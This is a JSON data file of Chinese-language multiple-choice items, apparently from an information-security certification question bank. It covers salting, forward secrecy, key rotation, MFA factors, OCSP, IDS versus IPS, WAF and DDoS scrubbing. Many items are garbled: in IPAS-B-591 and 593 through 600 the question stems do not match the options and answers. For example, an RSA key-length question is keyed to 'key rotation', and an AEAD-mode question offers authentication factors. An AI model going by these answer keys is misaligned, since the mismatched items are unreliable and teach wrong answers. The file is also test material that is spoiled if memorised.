        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-587",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 減少資料庫儲存空間",
      "B. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "C. 讓密碼可以在遺忘時輕鬆還原明文",
      "D. 加快密碼雜湊運算速度以降低 CPU 負擔"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-588",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 能夠完全取代防火牆",
      "B. 能夠防止受害者遭遇釣魚網站欺騙",
      "C. 能讓傳輸速度提升 100 倍",
      "D. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-589",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "B. 只要沒被偷就可以永久使用無需變更",
      "C. 將金鑰直接張貼於內部公告欄以利備份",
      "D. 降低金鑰長度至 56-bit"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-590",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某知名大型網路電商平台為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所持（Something you have）",
      "B. 所具（Something you are）",
      "C. 所處（Somewhere you are）",
      "D. 所知（Something you know）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-591",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "關於對稱式加密演算法（Symmetric Encryption）與非對稱式加密演算法之比較，下列敘述何者正確？",
    "options": [
      "A. RSA-4096（非對稱演算法）",
      "B. Caesar 凱薩密碼",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. MD5（單向雜湊演算法）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-592",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "在非對稱加密（如 RSA）中，若甲欲傳送一份機密文件給乙，且僅允許乙能解密閱讀，甲應使用何者進行加密？",
    "options": [
      "A. 伺服器的私鑰（Server's Private Key）",
      "B. 伺服器的公鑰（Server's Public Key）",
      "C. 客戶端自己的公鑰",
      "D. 客戶端自己的私鑰"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-593",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "密碼學雜湊函數（Cryptographic Hash Function）之「雪崩效應（Avalanche Effect）」係指何種現象？",
    "options": [
      "A. 伺服器身分鑑別",
      "B. 交易不可否認性",
      "C. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "D. 資料機密性（Confidentiality）加密"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-594",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "數位簽章（Digital Signature）之生成與驗證流程中，簽署者產生簽章所使用的金鑰為：",
    "options": [
      "A. 建立 VPN 虛擬私人通道",
      "B. 設定高強度資料庫密碼",
      "C. 對稱式 AES-128 加密",
      "D. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-595",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "在 PKI X.509 憑證撤銷查驗中，相較於傳統定期下載的憑證撤銷清冊（CRL），「線上憑證狀態協定（OCSP）」具備何種優勢？",
    "options": [
      "A. Telnet 協定",
      "B. SMTP 郵件傳輸協定",
      "C. DNS 解析協定",
      "D. OCSP（線上憑證狀態協定）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "PKI",
        "zh": "公開金鑰基礎建設",
        "ipa": "/ˌpiː.keɪˈaɪ/"
      },
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "CRL",
        "zh": "憑證撤銷清冊",
        "ipa": "/ˌsiː.ɑːrˈel/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-596",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "多因素驗證（MFA）要求跨越不同類別之驗證維度。下列何者屬於「所具（Something you are）」的驗證因子？",
    "options": [
      "A. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "B. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "C. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "D. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-597",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "防範彩虹表（Rainbow Table）逆向比對破解密碼雜湊的最有效方法為：",
    "options": [
      "A. 減少資料庫儲存空間",
      "B. 加快密碼雜湊運算速度以降低 CPU 負擔",
      "C. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "D. 讓密碼可以在遺忘時輕鬆還原明文"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-598",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "在 TLS 加密交握中，採用何種金鑰交換演算法能確保即使伺服器私鑰日後遭到洩漏，過去已側錄攔截之歷史加密通訊流量依然無法被回溯解密？",
    "options": [
      "A. 能夠完全取代防火牆",
      "B. 能讓傳輸速度提升 100 倍",
      "C. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容",
      "D. 能夠防止受害者遭遇釣魚網站欺騙"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-599",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "關於密碼學金鑰長度與安全性，依據目前 NIST 標準，RSA 非對稱演算法建議之最低安全金鑰長度為：",
    "options": [
      "A. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "B. 將金鑰直接張貼於內部公告欄以利備份",
      "C. 降低金鑰長度至 56-bit",
      "D. 只要沒被偷就可以永久使用無需變更"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-600",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": false,
    "question": "現代對稱區塊加密演算法（如 AES）在進行資料加密時，若希望同時提供「資料機密性」與「訊息完整性鑑別（AEAD）」，應採用何種運作模式？",
    "options": [
      "A. 所知（Something you know）",
      "B. 所處（Somewhere you are）",
      "C. 所具（Something you are）",
      "D. 所持（Something you have）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-601",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某公務機關資訊處內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "B. 集線器（Hub）",
      "C. 傳統 Layer 3 靜態封包過濾路由器",
      "D. 無線基地台（AP）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-602",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "B. 伺服器會立即斷線崩潰",
      "C. 無法分析任何網路封包",
      "D. 會導致交換機網路速度降低 99%"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-603",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 採用旁路監聽方式部署之網路分析儀",
      "C. 僅使用本機記事本記錄",
      "D. 關閉所有網路交換機"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-604",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某大型連鎖量販流通集團對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 網站應用程式防火牆（WAF, Web Application Firewall）",
      "B. 本機防毒軟體",
      "C. 磁帶備份機",
      "D. 傳統 Layer 3 網路防火牆"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-605",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 停用所有交換器電源",
      "B. 允許所有人免認證使用",
      "C. 802.1X 網路接取控制（NAC, Network Access Control）",
      "D. 改用家用集線器"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-606",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 蜜罐系統",
      "B. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "C. 入侵防禦系統",
      "D. 反向代理（Reverse Proxy）"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-607",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 在內部防火牆手動逐筆封鎖 IP",
      "B. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "C. 重啟內部路由器",
      "D. 將伺服器網線拔除"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-608",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某大型連鎖量販流通集團傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 停用 Windows 內建防火牆",
      "B. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "C. 移除所有防毒軟體",
      "D. 增加硬碟儲存容量"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-609",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 代表網路速度過慢",
      "B. 代表蜜罐軟體損壞",
      "C. 判定為系統誤報，直接忽略",
      "D. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-610",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 檢查寄件時間是否在下班時間",
      "B. 僅壓縮電子郵件大小",
      "C. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "D. 僅檢查電子郵件主旨長度"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-611",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 集線器（Hub）",
      "B. 傳統 Layer 3 靜態封包過濾路由器",
      "C. 無線基地台（AP）",
      "D. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-612",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 會導致交換機網路速度降低 99%",
      "B. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "C. 無法分析任何網路封包",
      "D. 伺服器會立即斷線崩潰"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-613",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用旁路監聽方式部署之網路分析儀",
      "B. 僅使用本機記事本記錄",
      "C. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "D. 關閉所有網路交換機"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-614",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某知名大型網路電商平台對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 磁帶備份機",
      "B. 傳統 Layer 3 網路防火牆",
      "C. 本機防毒軟體",
      "D. 網站應用程式防火牆（WAF, Web Application Firewall）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-615",
    "level": "初級",
